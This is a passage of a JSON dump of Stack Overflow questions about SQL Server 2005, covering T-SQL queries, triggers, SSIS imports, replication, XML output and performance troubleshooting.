my_user.dbo.my_fact_table REBUILD WITH (FILLFACTOR=90)</code>) fails, the second statement which acts on my_second table WON'T be executed.</p>\n\n<p>I would like to know how could I modify the SQL Server 2005 code, in order to skip any error, going forward (in Oracle I would say, <code>WHEN OTHERS THEN NULL</code>).</p>\n\n<p>How could I achieve this?</p>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":13150356,"title":"How to display the first row, depending on a value","body":"<p>I am supposed to build a query that displays if a product passed quality test the first time. for example if product# 1234 fails the first test then don't display the value. I am running SQL Server 2005. I am thinking maybe using a <code>COALESCE</code> statement, or case when statement, any help would be appreciated. here is some sample data:</p>\n\n<pre><code>product#  test result   datetime\n1102494    Fail         20111129:07:57:50.203\n1102494    pass         20111130:16:48:28.140\n1102496    pass         20111129:11:09:32.140\n1102498    pass         20111129:08:21:10.218\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","replication"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":56,"score":0,"question_id":13082881,"title":"sql table with identity in merge replication","body":"<p>I have a table in SQL Server 2005 and I have an IDENTITY(1,1) property set for an ID column.  Records are inserted in a table at a local server as well as a remote server.  I am using Merge Replication to match the data from local server and remote server.</p>\n\n<p>What happens if I insert the same ID at the local server and the remote server?</p>\n\n<p>Please suggest what am I doing wrong here.</p>\n"},{"tags":["sql-server","sql-server-2005","dbo"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":18,"score":2,"question_id":13147695,"title":"SQL Server dbo permissions for specified databases","body":"<p>Can I assign SQL Server dbo permissions to a user, so it applies only for specified databases on a server?  Currently using SQL Server 2005.</p>\n"},{"tags":["c#","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":493,"score":0,"question_id":3226571,"title":"how i can generate programmatically \"insert into\" data script file from a database table?","body":"<p>is there an elegant object-orient based framework?</p>\n"},{"tags":["c#","sql-server-2005","dsn"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1309,"score":0,"question_id":2844074,"title":"How to create DSN for SQL Server using C#?","body":"<pre><code>using System;\n\nusing System.Collections.Generic;\n\nusing System.ComponentModel;\n\nusing System.Data;\n\nusing System.Drawing;\n\nusing System.Linq;\n\nusing System.Text;\n\nusing System.Windows.Forms;\n\nusing Microsoft.SqlServer.Management.Common;\n\nusing Microsoft.SqlServer.Management.Smo;\n\nusing System.Data.SqlClient;\n\nusing Microsoft.Win32;\n\nusing System.Runtime.InteropServices;\n\n\n[DllImport(\"ODBCCP32.dll\")]\n\nprivate static extern bool SQLConfigDataSource(IntPtr parent, int request, string driver, string attributes);\n\n\n\nnamespace CopyDatabase\n{\n\npublic partial class Synchronize : Form\n{\n\n    public Synchronize()\n    {\n        InitializeComponent();\n    }\n\n    private void Synchronize_Load(object sender, EventArgs e)\n    {\n        Server srv = new Server();\n        String[] s = { \"master\", \"tempdb\", \"model\", \"msdb\", \"Resource\", \"distribution\" };\n\n        foreach (Database database in srv.Databases)\n        {\n            int flag = 0;\n            for (int i = 0; i &lt; s.Length; i++)\n            {\n                if (String.Compare(database.Name, s[i], true) == 0)\n                {\n                    flag = 1;\n                    break;\n                }\n            }\n            if (flag == 0)\n            {\n                cmbSource.Items.Add(database.Name);\n                cmbDest.Items.Add(database.Name);\n            }\n        }\n    }\n    private void button1_Click(object sender, EventArgs e)\n    {\n       string str = \"SERVER=HOME\\0DSN=MYDSN\\0DESCRIPTION=MYDSNDESC\\0DATABASE=DBServer\\0TRUSTED_CONNECTION=YES\";\n        SQLConfigDataSource((IntPtr)0, 4, \"SQL Server\",str);\n    }\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Reference :\n<a href=\"http://social.msdn.microsoft.com/Forums/en-US/vscrystalreports/thread/441811b9-c4e9-4d15-97a3-7b92d2c9f318\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/vscrystalreports/thread/441811b9-c4e9-4d15-97a3-7b92d2c9f318</a></p>\n\n<p>Can anybody help me remove the following errors??</p>\n\n<blockquote>\n  <p>Error 1   Expected class, delegate,\n  enum, interface, or\n  struct    C:\\Documents and\n  Settings\\Pavan\\My Documents\\Visual\n  Studio\n  2008\\Projects\\CopyDatabase\\CopyDatabase\\Synchronize.cs    17  23  CopyDatabase</p>\n</blockquote>\n\n<p>.</p>\n\n<blockquote>\n  <p>Error 2   The name 'SQLConfigDataSource'\n  does not exist in the current\n  context   C:\\Documents and\n  Settings\\Pavan\\My Documents\\Visual\n  Studio\n  2008\\Projects\\CopyDatabase\\CopyDatabase\\Synchronize.cs    67  13  CopyDatabase</p>\n</blockquote>\n"},{"tags":["sql-server-2005","database-design","data-modeling"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1395,"score":3,"question_id":2391298,"title":"SQL Server primary key on datetime field","body":"<p>I'm creating a new table in SQL Server 2005 that needs 2 fields: DateTime and MyValue (Int32). The DateTime field will be unique so I will be setting a unique constraint on it.</p>\n\n<p>Which table structure is better and why?</p>\n\n<p>MyIndex (PK, int)<br>\nMyDate (datetime) (IX_UniqueKey)<br>\nMyValue (int)</p>\n\n<p>or</p>\n\n<p>MyDate (PK, datetime)<br>\nMyValue (int)</p>\n\n<p>My feeling is that I don't want an artificial PK (MyIndex) in this table because it is unnecessary and because the dates will be unique I will use them to access any record. However, it may be that it's more performant to have an artificial PK...?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13134739,"title":"is there a way to store a word file in SQL Server 2005?","body":"<p><br>\nI am trying to store a word file in mysql server management studio 2005 and when i researched for it all the post said try using blob. But the problem i have now is that there is no blob data type. Is there any other way to store the word file or even if possible a replacement for a blob data type\n<br>\nThanks </p>\n"},{"tags":["sql-server","sql-server-2005","triggers"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":524,"score":2,"question_id":3843256,"title":"Where does a Server trigger save in SQL Server?","body":"<p>A couple of days ago , I was practicing and I wrote some triggers like these :</p>\n\n<pre><code>create trigger trg_preventionDrop\non all server \nfor drop_database\nas\nprint 'Can not Drop Database'\nrollback tran\n\ngo \n\ncreate trigger trg_preventDeleteTable\non database\nfor drop_table\nas \nprint 'you can not delete any table'\nrollback tran\n</code></pre>\n\n<p>But the problem is I don't know where it has saved and How can I delete or edit those.</p>\n\n<p>Thank you </p>\n"},{"tags":["sql-server-2005","unicode","where-clause"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13133277,"title":"How To Use Where Clause & LIKE with Unicode Characters?","body":"<p>I Have a table with column donor details and i am using following query to bind a grid in asp.net back end is sql server 2005.donordetails is a unicode column</p>\n\n<pre><code>select donordetails,serialno,did from sktdonor where donordetails  like N'% \"+  DropDownList1.SelectedItem.Text +\" %' order by serialno asc\n</code></pre>\n\n<p><strong>THE QUERY GOT EXECUTED BUT IT SHOWS NO OUTPUT\nPLEASE HELP !!!!</strong></p>\n"},{"tags":["sql","xml","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13134610,"title":"SQL Server 2005 Query XML Data Type related","body":"<p>I am selecting 2 sets of columns from the same table, as follows.</p>\n\n<pre><code>select (select a, b, c from T1 FOR XML RAW('CAT1')),\n       (select d, e, f from T1 FOR XML RAW('CAT2'))\nfor XML PATH('Parent')\n</code></pre>\n\n<p>The result of the query is </p>\n\n<pre><code>&lt;Parent&gt;&amp;lt;CAT1 a=\"Data1\" b=\"Data2', c=\"Data3\" &amp;gt;&amp;lt;CAT2 d=\"Data4\" e=\"Data5\" f=\"Data6\"&amp;gt;&lt;/Parent&gt;\n</code></pre>\n\n<p>How to avoid? I would get enclosed in a proper parent xml?</p>\n\n<p>Expected Result</p>\n\n<pre><code>&lt;Parent&gt;\n   &lt;CAT1 a=\"Data1\" b=\"Data2', c=\"Data3\"&gt;\n   &lt;CAT2 d=\"Data4\" e=\"Data5\" f=\"Data6\"&gt;\n&lt;/Parent&gt;\n</code></pre>\n"},{"tags":["sql-server","oracle","sql-server-2008","sql-server-2005","oracle11g"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13133378,"title":"Data Migration From Oracle To SQL Server","body":"<p>I have Oracle database in that in one or more table I have blob data also, i.e. images are stored, now I would like to move that data to sql server database, what is the best way to do this ?</p>\n\n<p>I would like to test for one table migration which contains image data in the Oracle database and move into SQL Server table.</p>\n\n<p>How do I test for migrating data from one table from Oracle to SQL Server ?</p>\n\n<p>but first thing I would like to confirm is that whether Image data moving from Oracle DB to SQL Server DB is possible, is there anything has to be taken care while migrating ?</p>\n\n<p>Thanks in advance.</p>\n\n<p>With Best Regards</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13133352,"title":"Insert dynamic rows to a single column","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/451415/simulating-group-concat-mysql-function-in-microsoft-sql-server-2005\">Simulating group_concat MySQL function in Microsoft SQL Server 2005?</a>  </p>\n</blockquote>\n\n\n\n<p>How will I insert rows (which are dynamic) to a single column concatenated by space to a temp table. I'm using SQL Server 2005.</p>\n\n<p>Ex. <code>LetterTable</code>:</p>\n\n<pre><code>LetterID LetterRow\n    1        a\n    2        b\n    3        c\n    4        d\n    5        e\n</code></pre>\n\n<p>to insert to a temp table like</p>\n\n<p><code>#TempTable</code>:</p>\n\n<pre><code>LetterID LetterRow\n    1     a b c d e\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1880,"score":2,"question_id":4875513,"title":"error in Multiple Select statements in Insert statement","body":"<p>I am writing a query which has multiple select statements in an insert statement</p>\n\n<pre><code>    INSERT INTO dbo.Products \n    (ProductName, \n     SupplierID, \n     CategoryID, \n     UnitsInStock, \n     UnitsOnOrder, \n     ReorderLevel, \n     Discontinued)\nVALUES  \n    ('Twinkies' , \n     (SELECT SupplierID FROM dbo.Suppliers WHERE CompanyName = 'Lyngbysild'),\n     (SELECT CategoryID FROM dbo.Categories WHERE CategoryName = 'Confections'), \n     0, \n     0, \n     10, \n     0)\n</code></pre>\n\n<p>Actually it gives error</p>\n\n<pre><code>Msg 1046, Level 15, State 1, Line 4\nSubqueries are not allowed in this context. Only scalar expressions are allowed.\nMsg 102, Level 15, State 1, Line 4\nIncorrect syntax near ','.\n</code></pre>\n\n<p>Where these two select statements returns only one value.</p>\n"},{"tags":["sql","sql-server-2008","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13130303,"title":"SQL Server Query with boolean issue","body":"<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\n\nalter PROCEDURE [dbo].[TCCPAUsersAndNamesByJobPosition] @EmpOrfreeLance bit\n\nAS\nBEGIN\n    SET NOCOUNT ON;\n\n    SELECT distinct t1.UserId , tblCustomers.name \n    FROM tblTime t1\n    inner join tblCustomers on t1.UserId=tblCustomers.custID\n    where (t1.userid in (select distinct custID from tblCustomers where sectionCat Like '%,35%') )\n    AND (t1.UserId in (select distinct custID from tblCustomers where IsEmployee = @EmpOrfreeLance))\n\nend\n</code></pre>\n\n<p>tried it also with  <code>IsEmployee = CONVERT(bit,@EmpOrfreeLance)</code></p>\n\n<p>and <code>SET @EmpOrfreeLance= CASE @EmpOrfreeLance WHEN 1 THEN 0 ELSE 0 END</code></p>\n\n<p>same all it retuns same list with same results no matter what </p>\n\n<p>Shouldn't it be simple ???</p>\n\n<p><code>IsEmployee</code> col-datatype is <code>(bit,null)</code></p>\n\n<p>my dev SQL server is 2008 ..online server is 2005 should it be a matter ...  </p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13128685,"title":"Atomic update statement with select SQL Server","body":"<pre><code>INSERT stuff\nSET computed = 'working'\nWHERE id = (SELECT max(id) from STUFF WHERE x = y)\n</code></pre>\n\n<p>I would like to make this statement atomic in SQL Server 2005 SP 1.</p>\n\n<p>Is there a way of doing this without modifying the isolation level?</p>\n\n<p>I need to simulate an insert into a table with an Identity column as the pk. My current table doesn't have an Identity field as the pk but it needs to act like it does. So i need to get the max of the pseudo ID field and add 1 then insert the next row.</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":306,"score":1,"question_id":3616454,"title":"SQL Server: COLLATE CS->CI performance vs UPPER","body":"<p>What's better to use when comparing columns that could contains values with different cases? \nIs Collate faster?\nJust trying to figure this out because in our project with tons of data comparisons.\nwe use:</p>\n\n<pre><code>select * from table t1, table t2 where \nt1.col1 collate SQL_Latin1_General_CP1_CI_AS = t2.colb collate SQL_Latin1_General_CP1_CI_AS \n</code></pre>\n\n<p>why we can't rewrite as:</p>\n\n<pre><code>select * from table t1, table t2 where \nUPPER(t1.col1)  = UPPER(t2.colb)\n</code></pre>\n"},{"tags":["sql-server-2005","http","request","sup","data-change"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13123858,"title":"Implement triggers in SQL Server 2005 for DCN on SUP","body":"<p>I'm developing a Mobility project with Sybase Unwired Platform (SUP). The backend is SQL Server 2005 and the cache policy is DCN.</p>\n\n<p>The EIS has to send the HTTP request with JSON format to our server. I have done tests calling the http request in the browser and works fine.</p>\n\n<p>Now, I would like to implement some triggers or functions to:</p>\n\n<ul>\n<li>Populate the CDB with the initial data.</li>\n<li>Detect when any change occurs in a table and execute a function to do the request.</li>\n</ul>\n\n<p>The logical has to include if the status message of SUP is OK or not. If is not OK, has to retry the request, save into a log, or something...</p>\n\n<p>I don't find anything on Internet or Sybase documentation, only for SAP.</p>\n\n<p>Have you got any example for SQL Server?</p>\n\n<p>Thank you.</p>\n"},{"tags":["c#","unit-testing","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13123082,"title":"SQL script compatible SQL Server 2005","body":"<p>I have an application and this will \"install\" some stored procedures into a local database.</p>\n\n<p>I want to make a unit test to validate the stored procedures so that the will be valid from SQL Server 2005 and up.</p>\n\n<p>Is there a way to do this with / without SQL Server?</p>\n"},{"tags":["sql-server","sql-server-2005","sorting","natural-sort"],"answer_count":15,"favorite_count":10,"up_vote_count":19,"down_vote_count":0,"view_count":13098,"score":19,"question_id":34509,"title":"Natural (human alpha-numeric) sort in Microsoft SQL 2005","body":"<p>We have a large database on which we have DB side pagination. This is quick, returning a page of 50 rows from millions of records in a small fraction of a second.</p>\n\n<p>Users can define their own sort, basically choosing what column to sort by.  Columns are dynamic - some have numeric values, some dates and some text.</p>\n\n<p>While most sort as expected text sorts in a dumb way. Well, I say dumb, it makes sense to computers, but frustrates users.</p>\n\n<p>For instance, sorting by a string record id gives something like:</p>\n\n<pre><code>rec1\nrec10\nrec14\nrec2\nrec20\nrec3\nrec4\n</code></pre>\n\n<p>...and so on.</p>\n\n<p>I want this to take account of the number, so:</p>\n\n<pre><code>rec1\nrec2\nrec3\nrec4\nrec10\nrec14\nrec20\n</code></pre>\n\n<p>I can't control the input (otherwise I'd just format in leading 000s) and I can't rely on a single format - some are things like \"{alpha code}-{dept code}-{rec id}\".</p>\n\n<p>I know a few ways to do this in C#, but can't pull down all the records to sort them, as that would be to slow.</p>\n\n<p>Does anyone know a way to quickly apply a natural sort in Sql server?</p>\n"},{"tags":["sql-server","sql-server-2005","query"],"answer_count":7,"favorite_count":5,"up_vote_count":10,"down_vote_count":0,"view_count":8058,"score":10,"question_id":235515,"title":"Hierarchical Queries in SQL Server 2005","body":"<p>Way back when I was working in an Oracle shop I took the CONNECT_BY for granted.  Now I'm stuck working with SQL Server 2005 and have some nasty object hierarchies.  Specifically, we have a self referencing table where all child records have a column with their parent's id.  Currently we have a view that maps children to levels in the hierarchy and a nasty query that does the heavy lifting to connect parents with their children.  While this method works, it is far from elegant and reeks of taint.  I'm just curious how other people retrieve hierarchical data from SQL Server 2005.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13087929,"title":"SSIS 2005 - how to skip rows from input flat file programmatically","body":"<p>I need to import a .csv file into a SQL table.</p>\n\n<p>The  input file looks like:</p>\n\n<pre><code>gru,212,BNP10H,bnp10h,1,01,Gestore 01\nlimGru,2012-09-12,17:21:05,kair103,,,,\nlimGru,2012-10-19,09:45:03,kair028,,,,\nlimGru,2012-10-19,09:45:06,kair028,,,,\nlimGru,2012-10-19,09:45:14,kair028,,,,\ngru,207,BNP50E,bnp 50 equity,1,01,Gestore 01\nlimGru,2012-09-13,11:49:58,kair022,,,,\nlimGru,2012-10-05,15:20:11,kair048,,,,\nlimGru,2012-10-17,09:23:14,kair048,,,,\n</code></pre>\n\n<p>and i would import only the rows that begin with \"limGru\".</p>\n\n<p>Any idea in how to implement my task?</p>\n\n<p>EDITED: please note that the rows have different number of columns, depending on the first filed (\"gru\" or \"limGru\")</p>\n\n<p>EDITED 2: Please also take a look here:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/6294563/ssis-how-to-process-an-csv-input-file-with-a-variable-number-of-columns-based\">SSIS =- How to process an CSV input file with a variable number of columns based on record type (Header, Detail, Trailer)</a></p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13072021,"title":"Slow running query on my machine only","body":"<p>I'm running a simple <strong><code>select * from table</code></strong> query against Microsoft SQL Server 2005. The table has about 41000 records with a PK clustered index and I'm using windows integrated authentication.</p>\n\n<ul>\n<li><p>When I run this on my machine using Microsoft SQL Server Management Studio the query completes in about 1h45m. I have tried swithing from grid to text output, running it from command line using <code>SQLCMD</code> also tried ececuting <code>DBCC USEROPTIONS</code>, <code>DBCC DROPCLEANBUFFERS</code>, <code>DBCC FREEPROCCACHE</code> prior the query... nothing changed the speed of the query.</p></li>\n<li><p>When I run it from coleague workstation using my credentials the query completes normaly in no time. If a coleague runs the query on my workstation using their credentials the query is very slow as described above.</p></li>\n</ul>\n\n<p>I'm running out of ideas how to troubleshoot this problem. Somehow the problem seem to be linked to my machine, but I can not make sense out of it. Please also consider the following:</p>\n\n<ul>\n<li>I checked and made sure ODBC tracing is not enabled on my machine (Win7-64bit). I have installed SQL Server client tools with Microsoft Management Studio 2008 R2 and this is what I'm using to query the database.</li>\n<li>I also used VS2010 to run the same sql query and the result is identical.</li>\n<li>I run the query against copy of the same table/database but on a different server and the issue persists.</li>\n<li>When I run <strong><code>select count(*) from table</code></strong> - the query completes normaly with no delay.</li>\n<li>When I run a trace with SQL Server Profiler the query is just a long running query - I can not see anything abnormal.</li>\n<li>When I run the query in MS SQL Server Management Studio using text out put I can see after the initial buffer of about 85 records the subsequent records arrive in bulk of about 400 records at a time. For example 85 -> 407 -> 804 -> 1210 -> 1605 -> 1897 -> 2161 -> 2753 -> 3051 -> 3342 -> 3676 -> 4002 etc. In comparison of the coleagues workstation where you can see the records painted as continuous stream as the data arrives!???</li>\n<li>I also compared the actual Query Execution Plans on my machine and the other where the query is running normally - they appear to be identical.</li>\n</ul>\n\n<p>Could anyone make sense what could be going wrong here? Why running this from my machine is very slow but it executes normally from another workstation?... \nAny suggested actions steps to troubleshoot this problem?</p>\n\n<p>Thanks to everyone in advance!</p>\n"},{"tags":["sql-server-2005","visual-studio-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13119795,"title":"How to create parent-child relationship in sql server2005?","body":"<p>If i have two tables in my sql server 2005 and i need to create parent-child relationship between those tables so that i can retrieve that data using binding navigator in vb.net 2008?</p>\n"},{"tags":["vb.net","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13119825,"title":"Use of one bindingnavigator","body":"<p>I want to retrieve data from two different tables on one form in VB.NET. I am using SQL server 2005 database.\nAlso I want to use navigator to navigate the records that are retrieved from the two tables. How to accomplish this? </p>\n\n<p>Can anyone help?\nThanks in advance.</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":3,"view_count":34,"score":-3,"question_id":13117898,"title":"need help in joining values of 2 sql queries","body":"<p>m want to add the below query result and have to show in grid after year change</p>\n\n<p>please tell me how to do</p>\n\n<pre><code>SELECT 15- sum(EL) as el, 1 - sum(CL) as cl, 14 - sum(ML) as ml FROM attendance\n//current value of this query\nSELECT 15- sum(EL) as el, 1 - sum(CL) as cl, 14 - sum(ML) as ml\n//new values of this query\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5491,"score":0,"question_id":388497,"title":"How to switch sql-2005 Select Case When T-sql Naming?","body":"<pre><code>select \n(Case Remark01\nWhen 'l1' then type1\nwhen 'l2' then type2\nend) AS [?] --Remark .....want to switch name in here\nfrom mytable\n</code></pre>\n\n<p>Example ....</p>\n\n<pre><code>select \n(Case level\nWhen 'l1' then type1 ('l1' mean check constant string)\nwhen 'l2' then type2(('l2' mean check constant string))\nend) AS <b>(Case when 'l1' then [type01] Else [type02])</b>\nfrom mytable\n</pre>\n\n<pre>select level,type1,type2 from mytable\n</code></pre>\n\n<p>I using two program this mytable<br>\none program is want to show menu only type1 only<br>\none program is want to show menu only  type2 only<br>\nI using one view using two program..</p>\n"},{"tags":["sql","sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1768,"score":0,"question_id":829221,"title":"Force Package Failure From Send Mail Task in SSIS","body":"<p>Is there any way to force a package to fail from a Send Mail Task? We have a package whose last step is to send a failure message using the Send Mail Task if certain criteria are met. Usually, we create another Script Task directly after the Mail Task which just fails the package using code:</p>\n\n<pre><code>Dts.TaskResult = Dts.Results.Failure\n</code></pre>\n\n<p>Is there a way to eliminate the Script Task and fail the package directly from the Send Mail Task?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13118217,"title":"How to merge two stored procedure data","body":"<p>I have 2 stored procedures, each SP returns 2 data set with same schema.</p>\n\n<p>data are like </p>\n\n<pre><code>Stored procedure 1\n</code></pre>\n\n<p><code>Table1</code></p>\n\n<pre><code>ID       Name\n1        Apple\n2        Sony\n3        DELL\n</code></pre>\n\n<p><code>Table2</code></p>\n\n<pre><code>OrderID  CustomerName\n101        AB Stores\n202        Sony World\n301        PC House \n</code></pre>\n\n<p>Stored procedure 2</p>\n\n<p><code>Table1</code></p>\n\n<pre><code>ID       Name\n21        HP\n32        LG\n34        ACCER\n</code></pre>\n\n<p><code>Table2</code></p>\n\n<pre><code>OrderID  CustomerName\n1301        X-PC World\n2202        Your PC House\n3301        Ajant Stores\n</code></pre>\n\n<p>Now I want to merge data like this inside other stored procedure</p>\n\n<p>meargeData1 = SP1.Table1 + SP2.Table1 </p>\n\n<p>meargeData2 = SP1.Table2 + SP2.Table2</p>\n\n<p>please suggest me hot I can achieve it . </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13118273,"title":"Is there a way to restore sql server to default settings?","body":"<p>Basically i want all constraints, rules, keys , databases everything removed i want it as it was on the day i installed it . I do not want to re install it. Simply deleting database might not fix the problem i have</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13060272,"title":"How to process a CSV file with a number of columns changing in SSIS?","body":"<p>I have a complete CSV file that for instance have 6 columns:</p>\n\n<pre><code>Rec ID | Charge Category | Charge Type Category | Product Name | Account No | Cost \n</code></pre>\n\n<p>I've been running SSIS no problem with this condition.</p>\n\n<p>However, we found that one of the CSV file that is using less column than we have for instance:</p>\n\n<pre><code>Rec ID | Charge Type Category | Product Name |Cost\n</code></pre>\n\n<p>How do we handle this cause using \"Flat File Connection Manager\" type of connection is not working ?!?!</p>\n\n<p>Any other approach that we need to explore?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","performance","full-text"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":285,"score":0,"question_id":1875126,"title":"Any idea why contains(...) querys so slow in SQL Server 2005","body":"<p>I've got a simple select query which executes in under 1 second normally, but when I add in a contains(column, 'text') into the where clause, suddenly it's running for 20 seconds up to a minute. The table it's selecting from has around 208k rows.</p>\n\n<p>Any ideas what would cause this query to run so slow with just the addition of the contains clause?</p>\n"},{"tags":["sql-server-2005","jndi","kettle"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":257,"score":0,"question_id":6998481,"title":"JNDI exmple for connecting to a named instance of MsSQL","body":"<p>We're using Pentaho Data Integration(Open source ETL tool) and are trying to use a JNDI connection to connect to a MS SQL 2005 database.  If we use a default instance on the server it worked fine, however issue that we are having is trying to get it to connect to a named instance.</p>\n\n<p>If you could provide an example or somewhere to look we'd be grateful. </p>\n\n<p>Thanks. </p>\n"},{"tags":["sql-server-2005"],"answer_count":9,"favorite_count":5,"up_vote_count":4,"down_vote_count":0,"view_count":10751,"score":4,"question_id":1057389,"title":"SQL query to find Missing sequence numbers","body":"<p>I have column named \"sequence\" . I have data in this column like 1,2,3,4,5,7,9,10,15 .</p>\n\n<p>I need to find out missing sequence numbers from table .</p>\n\n<p>what is the sql query to find missing sequence numbers from table ? I am expecting results like 6,8,11,12,13,14</p>\n\n<p>Thanks a lot</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I just need to return one column like</p>\n\n<h2>Missing numbers</h2>\n\n<p>6<br />\n8<br />\n11<br />\n12<br />\n13<br />\n14  </p>\n\n<p>I am using only one table </p>\n\n<p>I tried this query but am not getting the expected result.Here is the query</p>\n\n<pre><code>select de.sequence + 1 as sequence from dataentry as de \nleft outer join dataentry as de1 on de.sequence + 1 = de1.sequence\nwhere de1.sequence is null  order by sequence asc;\n</code></pre>\n"},{"tags":["c#","sql-server-2005","c#-4.0","ado.net"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":50,"score":-2,"question_id":13106866,"title":"how to create alphnumerical unique ID in c#","body":"<p>I am creating a dealer form using c#\nIn which I wanted unique dealer Id for each dealer\nplease help me how to auto assign a unique code to \nnew member sequentially in the format </p>\n\n<blockquote>\n  <p>D1,D2, D3, D4,..</p>\n</blockquote>\n\n<p>I want to use disconnected enviorenment in ADO.net and \ni want to save that id in SQL server 2005</p>\n\n<p><a href=\"http://i.imgur.com/xUi9c.jpg\" rel=\"nofollow\">http://i.imgur.com/xUi9c.jpg</a></p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13073678,"title":"how to pull records with special characters in SQL (2005) Server?","body":"<p>I am trying to pull records that contain special characters like:</p>\n\n<pre><code>*,  +,  -, . (dot), ',  , /,  0-9\n</code></pre>\n\n<p>But did not have much sucess so far.</p>\n\n<p>The column is called People_Name and the names supposed to be in this format: Lastname, Firstname. For example, Smith, Johnson. However, due to data entry error,\nsome names show up as:</p>\n\n<pre><code> 681, Smith,  *S-Sean, Tom,   +, John,   -, Tim,  ., .,  /, Celo,  0-9999,\n Maria,  ', Irving, and sometime as 'Unknown, Alexis.\n</code></pre>\n\n<p>My current query (SQL Server 2005) is </p>\n\n<pre><code>Select People_name\n  from mytable\n where (People_name LIKE '%*%' \n    OR People_name LIKE '%-,%'\n    OR People_name LIKE '%+%'\n    OR People_name LIKE '%/%'\n    OR People_name LIKE '%unknown%')\n</code></pre>\n\n<p>I can keep adding the LIKE list but I am sure there is a way in SQL server that can pull the records with those special characters. With more than 10 million records in the table, \nit is quite repeated to sort and look for those special characters then use the LIKE operator like above.</p>\n\n<p>Can some one please look into it?</p>\n"},{"tags":["tsql","sql-server-2005","ddl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":13106647,"title":"TSQL DDL constraint error: \"Line 12: Incorrect syntax near '('.\"","body":"<p>I'm trying to create a table. Here's the creation DDL. I'm encountering an error when I run this on SQL Server 2005 MSDE. I have no idea why - it works fine on 2008/2012.</p>\n\n<pre><code>CREATE TABLE [dbo].[CuCompanyHolidays](\n    [HolidayID] [int] IDENTITY(1,1) NOT NULL,\n    [HolidayName] [varchar](255) NULL,\n    [HolidayDate] [datetime] NULL,\n    [PartOff] [float] NULL,\n    [CreateDate] [datetime] NULL,\n    [LastUpdate] [datetime] NULL,\n CONSTRAINT [PK_cuCompanyHolidays] PRIMARY KEY CLUSTERED \n(\n    [HolidayID] ASC\n)WITH (PAD_INDEX  = OFF, 